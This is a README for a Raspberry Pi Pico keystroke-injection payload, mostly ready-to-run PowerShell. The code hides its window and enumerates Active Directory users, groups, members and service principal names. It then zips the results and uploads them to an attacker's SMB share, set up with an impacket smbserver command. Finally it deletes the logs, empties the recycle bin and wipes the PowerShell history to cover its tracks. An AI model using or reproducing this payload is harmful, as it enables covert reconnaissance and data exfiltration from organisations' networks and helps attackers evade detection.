### Overview

**This payload performs the following:**

- minify current powershell window
- basic AD information collection
- Archive logs of information
- Upload log archive to an attacker's smbshare
- Cleanup
    - delete output logs
    - remove smb mapping
    - remove env variables
    - clear history

### Requirements

**Libraries for Pico**

- adafruit_hid/
- adafruit_bus_device/
- adafruit_register/
- adafruit_sdcard.mpy

**Smbserver (on attacker machine)**

- [impacket](https://github.com/SecureAuthCorp/impacket)

Start up the smb server with the following command:

```bash
sudo python3 impacket/examples/smbserver.py -smb2support -username <share_user> -password <share_pass> -ip <attacker_ip> <sharename> <share_path>
```

Example:

```bash
sudo python3 impacket/examples/smbserver.py -smb2support -username dev -password dev -ip 192.168.0.10 tmp /opt/tmp/loot/
```

### Payload Part 1/4

This minify's the powershell window.

```powershell
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] 
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int W, int H); '
$consoleHWND = [Console.Window]::GetConsoleWindow();
$consoleHWND = [Console.Window]::MoveWindow($consoleHWND, 0, 0, 0, 0);
$pshost = get-host
$pswindow = $pshost.ui.rawui
$newsize = $pswindow.buffersize
$newsize.height = 2000
$newsize.width = 200
$pswindow.buffersize = $newsize
$newsize = $pswindow.windowsize
$newsize.height = 1
$newsize.width = 1
$pswindow.windowsize = $newsize
```

### Payload Part 2/4

Modify these variables to fit your smb server details.

```powershell
$h = "192.168.0.10"
$u = "dev"
$p = "dev"
$share = "tmp"
```

### Payload Part 3/4

This is the bulk of the enumeration and data exfiltration.

```powershell
$dir = "$HOME\Desktop\logs"
mkdir $dir
$log1 = "$dir\log1.txt"
$log2 = "$dir\log2.txt"
$log3 = "$dir\log3.txt"
$log4 = "$dir\log4.txt"
$log5 = "$dir\log5.txt"
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() >> $log1
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Searcher.FindAll() >> $log2
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
{
echo "----------------------------------------------------------------------" >> $log2
$prop >> $log2
}
}
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.name >> $log3
}
foreach($line in [System.IO.File]::ReadLines($log3))
{
$groupname = $line
$Searcher.filter="(name=$groupname)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member >> $log4
}
}
$spns = @("http", "SQL", "sql", "smb")
ForEach ($spn in $spns) {
    $servicename = "http"
    $Searcher.filter="serviceprincipalname=*$servicename*"
    $Result = $Searcher.FindAll()
    Foreach($obj in $Result)
    {
    Foreach($prop in $obj.Properties)
    {
    $prop >> $log5
    }
    }
}
Compress-Archive -LiteralPath $dir -DestinationPath $dir\logs.zip
New-SmbMapping -LocalPath "T:" -RemotePath "\\$h\$share" -Username "$u" -Password "$p"
move-item -path $dir\logs.zip -Destination "\\$h\$share"
```

### Payload Part 4/4

This performs some cleanup

```powershell
Remove-Item $dir -Recurse
Clear-RecycleBin -Force
Remove-SmbMapping -RemotePath "\\$h\$share" -Force
Remove-Variable * -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath
exit
```